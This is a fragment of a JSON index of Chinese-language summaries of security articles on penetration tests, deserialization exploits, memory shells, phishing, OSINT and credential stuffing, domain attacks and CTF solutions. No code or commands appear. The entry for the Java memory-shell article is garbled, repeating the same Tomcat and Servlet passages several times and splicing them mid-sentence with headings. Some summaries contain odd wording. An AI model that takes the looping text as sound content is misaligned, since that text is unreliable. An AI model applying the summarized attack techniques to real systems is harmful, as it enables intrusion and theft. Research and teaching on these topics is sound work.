        "FileName": "8563-签名伪造的利用及思考.pdf"
    },
    {
        "page_content": "该文档介绍了作者对学校内网 webvpn 的一次漏洞挖掘测试，通过分析 webvpn 的加密规则，作者成功获取了内网资源的加密拼接内容，并利用 Python 脚本扫描内网资产。作者还发现了科研管理系统中存在的 Oracle SQL 注入漏洞，但由于 Sqlmap 无法获取数据，漏洞危害较小。",
        "FileName": "11074-记一次校园内网的edusrc漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档记录了作者在温故而知新面试靶场中遇到的挑战和解决过程。作者通过分析提示，尝试了多种方法，包括扫目录、上传绕过和代码审计，最终通过伪静态页面注入找到了管理员账号密码，并利用任意文件写入漏洞获得了远程登录权限。文档强调了代码审计的重要性，并指出上传点限制和伪静态页面是常见的挑战。",
        "FileName": "8580-温故而知新之面试靶场笔记.pdf"
    },
    {
        "page_content": "本文总结了获取 shell 的常见思路和方法，包括注⼊、上传、RCE、包含、漏洞组合拳、系统层、钓⻥等，涵盖了从常规渗透测试到攻防对抗、APT 攻击等多种场景。",
        "FileName": "7500-红队-Getshell总结.pdf"
    },
    {
        "page_content": "该文档提供了 Windows 系统应急响应的详细指南，涵盖了启动项、缓存文件、注册表、计划任务、端点和进程、文件 MD5 校验、隐藏后门、系统日志和浏览器信息等方面的排查和分析方法，旨在帮助安全人员快速识别和解决网络攻击。",
        "FileName": "10434-应急响应篇——Windows系统排查.pdf"
    },
    {
        "page_content": "该文档分析了 Jackson 库中 POJONode#toString 方法触发 getter 方法的原理，该方法通过调用 ObjectMapper#writeValueAsString 方法序列化对象，从而触发 BeanSerializer#serialize 方法，进而调用 BeanSerializerBase#serializeFields 方法，最终通过 BeanPropertyWriter#serializeAsField 方法触发 getter 方法。",
        "FileName": "12509-从bypassit1了解POJONode#toString调用getter方法原理.pdf"
    },
    {
        "page_content": "该文档分析了 Jackson-databind 库中的一个 SSRF 漏洞，该漏洞允许攻击者通过反序列化恶意输入来执行任意 HTTP 请求。漏洞源于 javax.swing.JEditorPane 类，该类在反序列化时会加载远程 URL，从而导致 SSRF。文档详细介绍了漏洞的利用条件、影响范围和修复建议，并提供了漏洞复现的代码示例。",
        "FileName": "8011-Jackson-databind SSRF浅析.pdf"
    },
    {
        "page_content": "**文档**\n\n**1.登录 JAVA 内存⻢的 “ ⼀⽣ ” JAVA 内存⻢的 “ ⼀⽣ ”**\n\n**内容**\n\nga0weI   /  2022-03-16 23:16:44  /  浏览数  21542\n\n前段时间总是发现客户那边出现了内存⻢弄的我头⼤，当时好像是⼀个脚本⼩⼦拿着 SummerSec 师傅的 ShiroAttack2 ⼯具打的， 客户那边正好 shiro 使⽤的默认密钥存在反序列化漏洞，然后被 * 穿了，当时本来说是准备研究以下那个⼯具学习⼀波，后来⼯作⼀ 堆其他杂事⼀拖再拖，最近想起来了，就系统的学习了下 java 内存⻢这块的技术。\n\n基于动态添加 Servlet 组件的内存⻢实现和分析\n\n基于动态添加框架组件的内存⻢实现和分析\n\nJavaagent 技术以及基于 Javaagent 和 Javassist 技术的内存⻢实现和分析\n\n冰蝎、哥斯拉的内存⻢实现\n\n内存⻢的检测查杀技术\n\n内存⻢反查杀技术\n\n内存⻢的 ” 持久化 “  复活技术\n\nEngine 、 Host  、 Context  、  Wrapper ；关系如下\n\nEngine （ org.apache.catalina.core.StandardEngine ）：最⼤的容器组件，可以容纳多个  Host 。\n\nHost （ org.apache.catalina.core.StandardHost ）：⼀个  Host  代表⼀个虚拟主机，⼀个 Host 可以包含多个  Context 。\n\nContext （ org.apache.catalina.core.StandardContext ）：⼀个  Context  代表⼀个  Web  应⽤，其下可以包含多个  Wrapper 。\n\nWrapper （ org.apache.catalina.core.StandardWrapper ）：⼀个  Wrapper  代表⼀个  Servlet （ 重点   ：上⽂提到的动态注册 Servlet 组件的内存⻢技术，想要动态的去注册 Servlet 组件实现内存⻢的⽬的，其中⼀个关键点就是如何获取 Wrapper 对像，再往上也就是如 何获取到 Context 对象，从⽽掌握整个 Web 应⽤）。\n\nServlet 、 Filter  、 Listener  ；处理请求时，处理顺序如下：\n\n请求   →  Listener  →  Filter  →  Servlet\n\nServlet:  最基础的控制层组件，⽤于动态处理前端传递过来的请求，每⼀个 Servlet 都可以理解成运⾏在服务器上的⼀个 java 程 序；⽣命周期：从 Tomcat 的 Web 容器启动开始，到服务器停⽌调⽤其 destroy() 结束；驻留在内存⾥⾯\n\nFilter ：过滤器，过滤⼀些⾮法请求或不当请求，⼀个 Web 应⽤中⼀般是⼀个 filterchain 链式调⽤其 doFilter() ⽅法，存在⼀个顺 序问题。\n\nListener ：监听器，以 ServletRequestListener 为例， ServletRequestListener 主要⽤于监听 ServletRequest 对象的创建和销毁 , ⼀个 Web 应⽤中⼀般是⼀个 listenerchain 链式调⽤其 requestDestroyed() ⽅法，存在⼀个顺序问题。\n\n对于 Tomcat 来说，⼀个 Web 应⽤中的 Context 组件为 org.apache.catalina.core.StandardContext 对象，前⽂也有提到我们在实现 通 ⼀、前⾔\n\n本⽂主要内容\n\n⼆、技术铺垫\n\n1 、 Tomcat 相关\n\n1 、）、 Tomcat  中有  4  类容器组件：\n\n2 、）、 Servlet 的三⼤基础组件：\n\n3 、）、 Tomcat 中 Context 对象的获取过动态注册 Servlet 组件的内存⻢技术 的时候，其中⼀个关键点就是如何获取 Wrapper 对像，再往上也就是如 何获取到 Context 对象，从⽽掌握整个 Web 应⽤）。\n\nServlet:  最基础的控制层组件，⽤于动态处理前端传递过来的请求，每⼀个 Servlet 都可以理解成运⾏在服务器上的⼀个 java 程 序；⽣命周期：从 Tomcat 的 Web 容器启动开始，到服务器停⽌调⽤其 destroy() 结束；驻留在内存⾥⾯\n\nFilter ：过滤器，过滤⼀些⾮法请求或不当请求，⼀个 Web 应⽤中⼀般是⼀个 filterchain 链式调⽤其 doFilter() ⽅法，存在⼀个顺 序问题。\n\nListener ：监听器，以 ServletRequestListener 为例， ServletRequestListener 主要⽤于监听 ServletRequest 对象的创建和销毁 , ⼀个 Web 应⽤中⼀般是⼀个 listenerchain 链式调⽤其 requestDestroyed() ⽅法，存在⼀个顺序问题。\n\n对于 Tomcat 来说，⼀个 Web 应⽤中的 Context 组件为 org.apache.catalina.core.StandardContext 对象，前⽂也有提到我们在实现 通 ⼀、前⾔\n\n本⽂主要内容\n\n⼆、技术铺垫\n\n1 、 Tomcat 相关\n\n1 、）、 Tomcat  中有  4  类容器组件：\n\n2 、）、 Servlet 的三⼤基础组件：\n\n3 、）、 Tomcat 中 Context 对象的获取过动态注册 Servlet 组件的内存⻢技术 的时候，其中⼀个关键点就是如何获取 Wrapper 对像，再往上也就是如 何获取到 Context 对象，从⽽掌握整个 Web 应⽤）。\n\nServlet:  最基础的控制层组件，⽤于动态处理前端传递过来的请求，每⼀个 Servlet 都可以理解成运⾏在服务器上的⼀个 java 程 序；⽣命周期：从 Tomcat 的 Web 容器启动开始，到服务器停⽌调⽤其 destroy() 结束；驻留在内存⾥⾯\n\nFilter ：过滤器，过滤⼀些⾮法请求或不当请求，⼀个 Web 应⽤中⼀般是⼀个 filterchain 链式调⽤其 doFilter() ⽅法，存在⼀个顺 序问题。\n\nListener ：监听器，以 ServletRequestListener 为例， ServletRequestListener 主要⽤于监听 ServletRequest 对象的创建和销毁 , ⼀个 Web 应⽤中⼀般是⼀个 listenerchain 链式调⽤其 requestDestroyed() ⽅法，存在⼀个顺序问题。\n\n对于 Tomcat 来说，⼀个 Web 应⽤中的 Context 组件为 org.apache.catalina.core.StandardContext 对象，前⽂也有提到我们在实现 通 ⼀、前⾔\n\n本⽂主要内容\n\n⼆、技术铺垫\n\n1 、 Tomcat 相关\n\n1 、）、 Tomcat  中有  4  类容器组件：\n\n2 、）、 Servlet 的三⼤基础组件：\n\n3 、）、 Tomcat 中 Context 对象的获取过动态注册 Servlet 组件的内存⻢技术 的时候，其中⼀个关键点就是如何获取 Wrapper 对像，再往上也就是如 何获取到 Context 对象，从⽽掌握整个 Web 应⽤）。\n\nServlet:  最基础的控制层组件，⽤于动态处理前端传递过来的请求，每⼀个 Servlet 都可以理解成运⾏在服务器上的⼀个 java 程 序；⽣命周期：从 Tomcat 的 Web 容器启动开始，到服务器停⽌调⽤其 destroy() 结束；驻留在内存⾥⾯\n\nFilter ：过滤器，过滤⼀些⾮法请求或不当请求，⼀个 Web 应⽤中⼀般是⼀个 filterchain 链式调⽤其 doFilter() ⽅法，存在⼀个顺 序问题。\n\nListener ：监听器，以 ServletRequestListener 为例， ServletRequestListener 主要⽤于监听 ServletRequest 对象的创建和销毁 , ⼀个 Web 应⽤中⼀般是⼀个 listenerchain 链式调⽤其 requestDestroyed() ⽅法，存在⼀个顺序问题。\n\n对于 Tomcat 来说，⼀个 Web 应⽤中的 Context 组件为 org.apache.catalina.core.StandardContext 对象，前⽂也有提到我们在实现 通 ⼀、前⾔\n\n本⽂主要内容\n\n⼆、技术铺垫\n\n1 、 Tomcat 相关\n\n1 、）、 Tomcat  中有  4  类容器组件：\n\n2 、）、 Servlet 的三⼤基础组件：\n\n3 、）、 Tomcat 中 Context 对象的获取过动态注册 Servlet 组件的内存⻢技术 的时候，其中⼀个关键点就是如何获取 Wrapper 对像，再往上也就是如 何获取到 Context 对象，从⽽掌握整个 Web 应⽤）。\n\nServlet:  最基础的控制层组件，⽤于动态处理前端传递过来的请求，每⼀个 Servlet 都可以理解成运⾏在服务器上的⼀个 java 程 序；⽣命周期：从 Tomcat 的 Web 容器启动开始，到服务器停⽌调⽤其 destroy() 结束；驻留在内存⾥⾯\n\nFilter ：过滤器，过滤⼀些⾮法请求或不当请求，⼀个 Web 应⽤中⼀般是⼀个 filterchain 链式调⽤其 doFilter() ⽅法，存在⼀个顺 序问题。\n\nListener ：监听器，以 ServletRequestListener 为例， ServletRequestListener 主要⽤于监听 ServletRequest 对象的创建和销毁 , ⼀个 Web 应⽤中⼀般是⼀个 listenerchain 链式调⽤其 requestDestroyed() ⽅法，存在⼀个顺序问题。\n\n对于 Tomcat 来说，⼀个 Web 应⽤中的 Context 组件为 org.apache.catalina.core.StandardContext 对象，前⽂也有提到我们在实现 通 ⼀、前⾔\n\n本⽂主要内容\n\n⼆、技术铺垫\n\n1 、 Tomcat 相关\n\n1",
        "FileName": "11003-JAVA内存马的“一生”.pdf"
    },
    {
        "page_content": "该文档详细介绍了 XMLDecoder 语法分析器，包括其标签属性、可加载类、getValueObject 方法以及漏洞触发点。它还提供了 XML 基本语法和 XMLDecoder 漏洞的示例，展示了如何使用该语法分析器执行命令、连接套接字和创建文件。",
        "FileName": "7944-XMLDecoder语法分析.pdf"
    },
    {
        "page_content": "该文档分析了 RMI、JNDI 和 fastjson 中的漏洞，重点介绍了利用 JNDI 注入和 fastjson 反序列化来实现远程代码执行。它还提供了 POC 和修复措施，并讨论了不同 fastjson 版本中的漏洞利用技术。",
        "FileName": "11967-从0到1RMIJNDIfastjson.pdf"
    },
    {
        "page_content": "该文档探讨了 Java 开发中常见的安全问题，包括 SQL 注入、XSS、文件上传和 XXE，并提供了解决这些问题的安全代码示例。",
        "FileName": "11890-JAVA开发中涉及的基础安全问题和解决方法初探.pdf"
    },
    {
        "page_content": "该文档详细描述了作者对校内网站进行渗透测试的过程，包括利用 SQL 注入漏洞、查看目录、使用命令执行、创建新用户、关闭防火墙和开启远程桌面端口等步骤。作者还遇到了安全策略问题，导致无法使用简单密码创建新用户，最终通过使用复杂密码解决了问题。",
        "FileName": "9444-记一次不曲折的校内站点渗透.pdf"
    },
    {
        "page_content": "该文档主要介绍了 FastJson 中的原生命序列化漏洞，包括利用 JSONArray 和 JSONObject 类中的 toString 方法触发 getter 方法，以及 FastJson 1.2.49 版本中绕过安全检查的技巧，最后提供了利用流程和参考文章。",
        "FileName": "12755-Java反序列化之FastJson原生反序列化.pdf"
    },
    {
        "page_content": "这篇文档介绍了 iOS 安全基础知识，包括内核引导自举安全研究、Mach 消息、Mach 端口、MIG、堆分配基础、CoreTrust、PAC 等，以及一些流行的漏洞利用技术，例如伪造内核任务端口、通过 task_for_pid() 读取内核等。这些知识是理解后续两部分内容的基础。",
        "FileName": "8509-从0到tfp0第一部分：基础知识.pdf"
    },
    {
        "page_content": "这篇文档介绍了针对公司发起 OSINT 红队测评的技巧，包括利用 LinkedIn 查找员工信息、使用 Hunter.io 收集电子邮件地址、利用 Weleakinfo 进行撞库攻击、使用 Google Dorking 生成电子邮件地址以及绕过验证码进行自动化抓取。这些技巧可以帮助红队评估人员识别目标公司员工，收集他们的个人信息，并生成高质量的网络钓鱼列表。",
        "FileName": "7610-红队测评技巧：对公司发起OSINT.pdf"
    },
    {
        "page_content": "本文探讨了域渗透中组策略的利用，重点关注本地组策略 (LGP) 和域组策略 (GPP)。LGP 允许在独立计算机上管理组策略对象，而 GPP 则通过组策略首选项 (GPP) 扩展了组策略的功能，允许对域资源进行更细粒度的控制。文章提供了利用 GPP 漏洞获取域内用户密码的详细步骤，并讨论了利用 GPO 进行后门部署和远程执行的策略。",
        "FileName": "7784-浅析域渗透中的组策略利用.pdf"
    },
    {
        "page_content": "本文档详细介绍了如何使用 Ghidra 中的汇编列表来分析和修复一个简单程序中的漏洞，该漏洞导致程序在处理某些无效输入时进入一个不返回的循环。通过逐步分析程序的汇编代码，本文档确定了导致循环的条件，并提供了通过将有符号比较替换为无符号比较来修复该漏洞的分步说明。",
        "FileName": "12699-用ghidra中的列表修补程序中的bug.pdf"
    },
    {
        "page_content": "通达 OA 存在文件上传和文件包含漏洞，攻击者无需登录即可上传图片木马文件，然后通过精心构造的请求进行文件包含，实现远程命令执行。",
        "FileName": "7424-通达OA文件上传&文件包含导致RCE浅析.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Python 字符串格式化特性绕过服务器端模板注入 (SSTI) 过滤的方法。它利用 Python 字符串格式化允许指定 ASCII 码为字符的特性，将被过滤的内容转换为 ASCII 码，然后使用 |attr() 函数将其带到外部参数中。该方法的优点是绕过了点号、关键字和下划线过滤，但缺点是长度爆炸和可读性差。文档还探讨了使用 f-string 进一步绕过过滤的可能性，但由于 Flask 模板渲染引擎不支持该特性而未成功。",
        "FileName": "7519-利用Python字符串格式化特性绕过ssti过滤.pdf"
    },
    {
        "page_content": "该文档详细介绍了红队攻防实战中从边界突破到漫游内网的步骤，包括SQL注入、提权、内网信息收集、内网穿透、拿下域内主机、权限维持等技术，旨在帮助读者理解红队攻防实战中的常见技术和方法。",
        "FileName": "10584-红队攻防之从边界突破到漫游内网(无cs和msf).pdf"
    },
    {
        "page_content": "该文档介绍了两种在 Windows 操作系统中让程序在运行时自动启动用户帐户控制 (UAC) 的方法，包括使用 Visual Studio 和 mt.exe 工具。它还讨论了如何为程序添加发布者签名，以增加钓鱼成功的可能性。",
        "FileName": "8705-钓鱼技巧：.manifest自启UAC与强签名.pdf"
    },
    {
        "page_content": "该文档详细介绍了四层内网攻防渗透测试实验，包括信息收集、tomcat getshell、redis 未授权访问、CVE-2021-3493 提权、两层隧道搭建、OpenSSH 命令注入漏洞、内网主机存活扫描、ms17-010 漏洞利用、内网信息收集、获取域控等步骤，并提供了相关工具和脚本的下载地址。",
        "FileName": "12614-记一次四层内网攻防渗透测试大实验.pdf"
    },
    {
        "page_content": "Semgrep 是一款轻量级代码审计工具，它支持多种编程语言，并提供丰富的规则库和扩展性，可用于发现和修复软件代码中的安全漏洞、代码质量问题和最佳实践违规等。",
        "FileName": "12696-轻量级代码审计工具 Semgrep.pdf"
    },
    {
        "page_content": "本文介绍了五个开源框架，包括 Tencent/wepy、youzan/vant-weapp、dcloudio/uni-app、didi/chameleon 和 haojy/weact，这些框架可以帮助开发者解锁小程序开发，提供 UI 组件、基础框架和代码翻译等功能，并附有 OpenSCA 检测结果，帮助开发者了解开源组件的风险。",
        "FileName": "12022-开源分享如何解锁小程序开发？这份攻略请收好！.pdf"
    },
    {
        "page_content": "**主题：** PHP 自定义恶意扩展 SO 的编写过程\n\n**内容：** 文档详细介绍了如何编写 PHP 自定义恶意扩展 SO，包括前置知识、扩展编写、编译和使用恶意扩展等步骤。该过程涉及使用 dlopen() 和 dlsym() 函数加载 SO 库，注册扩展，编写扩展函数，编译扩展，并使用 LD_PRELOAD 环境变量动态加载恶意扩展。",
        "FileName": "7330-php自定义恶意扩展so编写过程.pdf"
    },
    {
        "page_content": "该文档介绍了一种在 FULL RELRO 下利用低位覆盖技术攻击二进制文件的方法。该方法通过将 GOT 表写入 BSS 段，然后低位覆盖成输出函数，泄露真实地址，再使用基础 ROP 链攻击。文档提供了详细的步骤和示例代码，说明如何构造 CSU、利用 RDX 控制寄存器和程序执行流，以及如何泄露 libc 地址并获取 shell。",
        "FileName": "12731-FULL RELRO下的低位覆盖.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 mitm6 通过 DNS 中继进行 Kerberos 身份验证，从而绕过传统缓解措施并实现对 Windows 域网络的攻击。通过劫持客户端的 IPv6 DHCP 请求并接管其 DNS，攻击者可以诱导客户端机器使用 Kerberos 及其机器帐户向攻击者进行身份验证。此身份验证可以中继到任何不强制执行完整性保护的服务，例如基于 HTTP 协议的 Active Directory 证书服务 (AD CS) 的 Web 注册接口。",
        "FileName": "11289-使用 MITM6 通过 DNS 中继 Kerberos 身份验证.pdf"
    },
    {
        "page_content": "该文档分析了天生产想 OA 协同办公系统和苦菊 OA 系统中的四个漏洞，包括未授权任意文件上传、任意文件上传、任意文件删除和重装系统 Getshell，并提供了漏洞利用的详细步骤和 POC。",
        "FileName": "9853-记一次对俩OA协同办公系统​的审计分析.pdf"
    },
    {
        "page_content": "该文档记录了一次无意的渗透测试，作者通过扫描网站漏洞发现了备份文件，并通过爆破绝对路径获取了源码。作者尝试了多种方法绕过disable_functions函数，最终利用蚁剑插件成功执行命令并提权。",
        "FileName": "9364-记一次无意的渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了无需字符、数字或下划线的 webshell 总结，介绍了利用异或、取反和自增等方法构造不包含字符、数字或下划线的 webshell，并提供了多个示例和解题思路。",
        "FileName": "8107-无字母数字webshell总结.pdf"
    },
    {
        "page_content": "文档分析了 ByteCTF re moderncpp 题目的解题思路，该题目涉及 C++ 数据结构逆向和程序逻辑理解。解题过程包括输入检查、初始化、数据处理和最终比较。其中，数据处理的关键步骤是使用 Huffman 编码对输入进行编码，并与预先加密的数据进行比较以验证正确性。",
        "FileName": "10426-ByteCTF re moderncpp 题解.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 Vulnhub 练习 DC: 8 的渗透测试过程，包括信息收集、SQL 注入、漏洞利用和提权，最终获得了目标机器的控制权。",
        "FileName": "12091-(Vulnhub练习)-- DC 8渗透实战.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 GadgetInspector 工具挖掘 Java 反序列化漏洞，该工具通过污点分析技术自动识别反序列化利用链。GadgetInspector 能够分析用户代码中包含的多个依赖库，并根据现有的知识储备挖掘出由多个依赖组成的反序列化利用链。",
        "FileName": "10908-高效挖掘反序列化漏洞——GadgetInspector改造.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 Puppeteer 和 Burp 插件结合实现漏洞检测。通过将 Headless 流量通过 Burp，并编写自定义插件，可以检测漏洞，例如 SQL 注入，同时减少数据包发送量，提高漏洞发现效率。",
        "FileName": "7070-NodeJS Headless 动态漏扫爬虫学习记录(漏洞检测篇).pdf"
    },
    {
        "page_content": "该文档分析了 XML 外部实体注入 (XXE) 漏洞，包括其主题、内容、如何判断是否存在 XXE 漏洞、如何利用 XXE 漏洞以及如何防御 XXE 漏洞。",
        "FileName": "10774-审计JAVA下的XXE.pdf"
    },
    {
        "page_content": "本文分析了几个开源的 Syscall 项目，这些项目通过绕过 EDR 用户态 hook，直接调用内核态 API 来实现系统调用。这些项目通过不同的方式获取系统调用号，如遍历 PEB、解析导出表、使用异常目录表等。它们还采用了不同的间接系统调用方法，如直接系统调用、随机系统调用跳转、mini shellcode、硬件断点等，以规避检测特征。",
        "FileName": "12885-几个Syscall项目的学习记录.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic T3 反序列化漏洞，并介绍了如何利用该漏洞进行 Java 安全学习。它详细介绍了漏洞的复现过程，包括配置远程调试环境、分析 T3 协议、利用 T3 协议攻击原理、利用 JRMP 协议进行攻击以及漏洞分析。",
        "FileName": "8241-从WebLogicT3反序列化学习Java安全.pdf"
    },
    {
        "page_content": "**主题：** LDAP 注入的深入利用\n\n**内容：** 本文探讨了 LDAP 注入的深入利用，介绍了 LDAP 过滤器语法、LDAP 条目常见属性值，以及如何通过构造通配符查询来实现布尔注入，从而带出 LDAP 中储存的数据，包括用户名、手机号、邮箱，甚至用户密码。文章还提供了利用 octetStringOrderingMatch 匹配规则来匹配字节序列，从而获取 LDAP 中存储的密码的详细步骤。",
        "FileName": "10985-LDAP注入的深入利用.pdf"
    },
    {
        "page_content": "该文档分析了 BBS 论坛管理员后台后端未校验漏洞导致 getshell 的问题。通过对代码的跟踪和分析，作者发现该漏洞允许普通用户通过上传 JSP 文件来执行命令。作者还提供了漏洞的修复建议，并分享了在 Java 代码审计中发现漏洞的经验。",
        "FileName": "7036-bbs论坛管理员后台后端未校验漏洞导致getshell的一点点分析和思考.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Struts2 中的 S2-059 漏洞，该漏洞允许攻击者通过 OGNL 表达式执行远程代码执行。文档详细介绍了漏洞的原理、影响范围、利用条件和修复措施，并提供了漏洞复现和分析的代码示例。",
        "FileName": "8653-S2-059 RCE浅析.pdf"
    },
    {
        "page_content": "本文档详细介绍了栈溢出漏洞的原理和利用技术，包括 ret2text、ret2shellcode、ret2syscall 和 ret2libc，并通过多个示例演示了如何利用这些技术在不同情况下控制程序执行流。此外，文档还介绍了格式化字符串漏洞和整数溢出漏洞的原理和利用方法，并提供了相应的示例。",
        "FileName": "11047-二进制漏洞学习笔记 - PWN篇.pdf"
    },
    {
        "page_content": "CVE-2022-45315 漏洞存在于 MikroTik RouterOS SNMP 进程中，允许攻击者通过精心设计的 SNMP 数据包执行任意代码。该漏洞利用了 RouterOS 自定义协议中的越界读取，导致攻击者可以控制执行流，但无法控制其他参数。",
        "FileName": "12769-CVE-2022-45315 RouterOS SNMP 越界读漏洞研究.pdf"
    },
    {
        "page_content": "**文档主题：** FastJson 安全初探 - 反序列化漏洞回顾分析\n\n**文档内容：**\n\nFastJson 是阿里巴巴开源的 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 JavaBean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 JavaBean。序列化的函数为 JSON.toJSONString，反序列化的函数为 JSON.parseObject。\n\nFastJson 存在反序列化漏洞，主要原因是 FastJson 支持的两个特性：\n\n* fastjson 反序列化时，JSON 字符串中的 @type 字段，用来表明指定反序列化的目标恶意对象类。\n* fastjson 反序列化时，字符串时会自动调用恶意对象的构造方法，set 方法，get 方法，若这类方法中存在利用点，即可完成漏洞利用。\n\n主要存在两种利用方式：\n\n* JdbcRowSetImpl(JNDI)\n* TemplatesImpl(Feature.SupportNonPublicField)\n\n**结论：**\n\nFastjson 1.2.24 远程代码执行 &&TemplatesImpl 利用链",
        "FileName": "7846-FastJson安全初探-反序列化漏洞回顾分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 SQL 注入和人脸识别绕过对移动应用程序的渗透测试，包括识别加密算法、构造注入有效载荷、获取真实用户信息以及绕过人脸认证等步骤。",
        "FileName": "8308-App渗透 - 从SQL注入到人脸识别登录绕过.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 medium_socnet 靶机的渗透测试过程，包括主机发现、端口扫描、服务发现、路径爬取、代码注入、Docker 容器判断、内网穿透、漏洞利用、密码破解和本地提权，最终成功获得了靶机的 root 权限。",
        "FileName": "12065-medium_socnet靶机打靶过程和思考.pdf"
    },
    {
        "page_content": "该文档分析了 large bin attack 的原理和实现，并提供了两个示例来演示如何在 libc-2.23 和 libc-2.31 中利用该攻击技术。",
        "FileName": "12751-large bin attack.pdf"
    },
    {
        "page_content": "该文档重点介绍了登录框漏洞测试，包括常见的漏洞类型，如弱口令、SQL注入、越权、逻辑漏洞、短信轰炸、邮箱轰炸和信息泄露。文档提供了具体示例和技巧，指导读者如何识别和利用这些漏洞，并推荐了字典下载网站以增强漏洞挖掘效率。",
        "FileName": "11577-实战登录框漏洞测试.pdf"
    },
    {
        "page_content": "该文档描述了 Apache Apisix 中的 CVE-2022-29266 漏洞，该漏洞允许攻击者通过向受 jwt-auth 插件保护的路由发送不正确的 JSON Web 令牌来获取插件配置的机密，因为依赖库中的错误逻辑允许将 RS256 令牌发送到需要 HS256 令牌的端点，错误响应中包含原始密钥值。",
        "FileName": "11283-CVE-2022-29266 Apache Apisix  jwt-auth插件 密钥泄漏.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 Ghidra 创建一个 Processor，将二进制代码翻译为汇编代码。它提供了创建 Processor 的步骤，包括安装 Eclipse、安装 GhidraDev 插件、创建项目、定义寄存器、定义指令格式、编写指令定义文件以及测试 Processor。",
        "FileName": "10314-Ghidra Processor创建教程——从二进制到汇编代码.pdf"
    },
    {
        "page_content": "该文档分析了某后台管理系统的安全漏洞，包括任意修改管理员用户名和密码、SQL注入、存储型XSS、任意增删改查数据表内容和任意文件上传。这些漏洞主要源于框架配置不当、未授权访问、输入过滤不严格和鉴权机制失效等问题。",
        "FileName": "11669-某后台管理系统的审计.pdf"
    },
    {
        "page_content": "本文介绍了如何在不出网环境中利用 SMB Beacon 和永恒之蓝漏洞渗透域内主机，包括信息收集、横向移动、漏洞检测和利用、提权等步骤，并提供了详细的命令和操作指南。",
        "FileName": "9607-巧用smb拿下不出网主机.pdf"
    },
    {
        "page_content": "该文档探讨了 .NET 中 ObjectStateFormatter 的反序列化，它与 LosFormatter 类似，但没有 MAC/密钥。它介绍了使用 ObjectStateFormatter 和 LosFormatter 生成有效负载的攻击链，重点关注 RolePrincipal 和 WindowsPrincipal 类。通过利用 ClaimsIdentity 小工具和 TextFormattingRunPropertiesMarshal 类，攻击者可以构造恶意有效负载，导致远程代码执行 (RCE)。",
        "FileName": "9598-.net反序列化之ObjectStateFormatter.pdf"
    },
    {
        "page_content": "**主题：** ForU CMS 中的 SQL 注入漏洞\n\n**内容：** ForU CMS 中的 SQL 注入漏洞源于对用户输入的过滤不当，攻击者可以通过构造恶意 SQL 语句来绕过过滤，从而执行任意 SQL 查询或命令。该漏洞影响 arr_insert() 和 arr_update() 函数，这些函数用于将用户输入的参数拼接成 SQL 语句。攻击者可以通过在参数中注入 SQL 语句来利用此漏洞，从而在数据库中执行任意查询或命令。",
        "FileName": "8134-Foru cms SQL注入.pdf"
    },
    {
        "page_content": "本文深入探讨了 SSRF 在 CTF 中的各种实现方式，包括利用 Redis、Gopher、FastCGI、PHP-FPM、Python-urllib 等协议和服务，并提供了详细的示例和攻击原理，涵盖了信息收集、shell 写入、主从复制、RCE 等多种攻击手法。",
        "FileName": "8613-浅析SSRF在CTF中的各种实现方式.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 系统的漏洞，包括前台 SQL 注入、后台文件包含和前台用户登录检测绕过。其中，前台 SQL 注入漏洞可以通过未经过滤的参数注入到 SQL 语句中，导致任意代码执行；后台文件包含漏洞可以通过上传恶意模板文件并将其包含在渲染过程中，导致任意代码执行；前台用户登录检测绕过漏洞可以通过自定义验证码存储 session 的键名，绕过登录状态检测。",
        "FileName": "10846-某CMS审计(php).pdf"
    },
    {
        "page_content": "C3P0 反序列化链利用 C3P0、mchange-commons-java 和 com.sun.jndi.rmi.registry.RegistryContext 中的三个 gadget，通过反射创建 PoolBackedDataSourceBase 实例，设置其 connectionPoolDataSource 属性为 PoolSource，PoolSource 实现 Referenceable 接口，返回恶意类的远程加载信息，在反序列化时触发 getObject 方法，通过 ReferenceableUtils.referenceToObject 加载并执行恶意类，完成攻击。",
        "FileName": "10273-C3P0反序列化链浅析.pdf"
    },
    {
        "page_content": "ATutor 学习内容管理系统存在任意文件上传漏洞 (CVE-2019-12169)，攻击者可利用该漏洞远程执行代码。该漏洞不仅存在于语言导入功能中，还存在于其他功能模块中，如主题导入、问题导入和补丁导入。这些功能在导入压缩包时未对文件进行校验，导致攻击者可通过上传恶意压缩包来执行任意代码。",
        "FileName": "7695-ATutor学习内容管理系统任意文件上传漏洞(CVE-2019-12169)分析.pdf"
    },
    {
        "page_content": "本文档分析了如何使用 Frida 获取 Unity IL2CPP 符号信息，重点关注 Android 平台上使用 IL2CPP 模式编译的《原神》游戏。通过分析 IL2CPP 加载过程和 hook SetupMethodsLocked 函数，作者成功获取了 MethodInfo 和 Il2CppClass 的符号信息和地址，但指出游戏进行了混淆，需要进一步分析。",
        "FileName": "8628-使用frida获取unity il2cpp符号信息.pdf"
    },
    {
        "page_content": "该文档记录了 2023 年陇剑杯部分 writeup，涵盖了利用 CVE-2022-22965 漏洞反弹 shell、分析病毒文件、获取被入侵主机 IP 和口令、连接蚁剑、获取攻击者留存值、下载攻击者 flag、找到服务器自带后门文件、获取服务器内网 IP、获取攻击者写入服务器的 key、爆破登录用户名和密码、越权使用 cookie、读取应用配置文件、执行系统命令、下载攻击者工具、解密前端加密的密码、获取 flask 网站启动用户、获取攻击者写入的内存马路由名等内容。",
        "FileName": "12806-2023年陇剑杯部分writeup.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过赌博网站的 WAF（Web 应用程序防火墙）并获取 shell 访问权限。它描述了利用 PHP 集成环境（upupw）的漏洞，通过设置全局变量来启用通用日志记录，并使用免杀 shell 绕过 WAF。该文档还提供了使用 JavaScript 远程下载脚本以避免拦截 PHP 代码的技巧。",
        "FileName": "9181-简单绕过waf拿下赌博网站.pdf"
    },
    {
